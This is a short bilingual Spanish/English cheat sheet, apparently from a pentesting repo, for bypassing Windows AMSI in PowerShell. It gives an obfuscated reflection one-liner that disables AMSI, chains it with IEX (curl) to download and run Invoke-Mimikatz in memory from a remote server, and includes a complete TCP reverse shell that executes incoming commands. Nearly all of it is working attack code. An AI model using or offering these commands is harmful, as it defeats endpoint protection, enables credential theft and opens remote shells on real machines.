# Amsi Bypass Powershell #

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true)
```

# Spanish:
Ejemplo de uso:

Guardar en un archivo, este script de Mimikatz de este repo:
https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1

Abres un servidor con Python o Apache y guardas el archivo con cualquier formato puedes guardar el archivo hasta en Webhost/Pastebin/Github etc, cualquier servidor con formato Raw y en la Powershell escribes el Bypass de AMSI + IEX (curl link)

## Ejemplo:

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true); IEX (curl http://192.168.0.7/mimiktz)
```

Con lo anterior Bypasseas amsi y haces una descarga del codigo del servidor y lo ejecutas en memoria

Tambien puedes guardar una reverse shell en el servidor

## Ejemplo de Reverse Shell en Powershell:

```
$client = New-Object System.Net.Sockets.TCPClient("ip",puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Lo guardas en un archivo, abres el servidor y ejeutas lo siguiente cambiando el servidor y nombre de archivo

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true); IEX (curl http://192.168.0.7/reverse)
```

# English:
Example of use:

Save to a file, this Mimikatz script from this repo:
https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1

You open a server with Python or Apache and save the file with any format you can save the file even in Webhost/Pastebin/Github etc, any server with Raw format and in the Powershell you write the AMSI + IEX Bypass (curl link)

## Example:

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true); IEX (curl http://192.168.0.7/mimiktz)
```

With the above Bypasseas amsi and download the code from the server and run it in memory.

You can also save a reverse shell on the server

## Example of Reverse Shell in Powershell:

```
$client = New-Object System.Net.Sockets.TCPClient("ip",puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Save it to a file, open the server and execute the following by changing the server and file name

```
$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true); IEX (curl http://192.168.0.7/reverse)
```
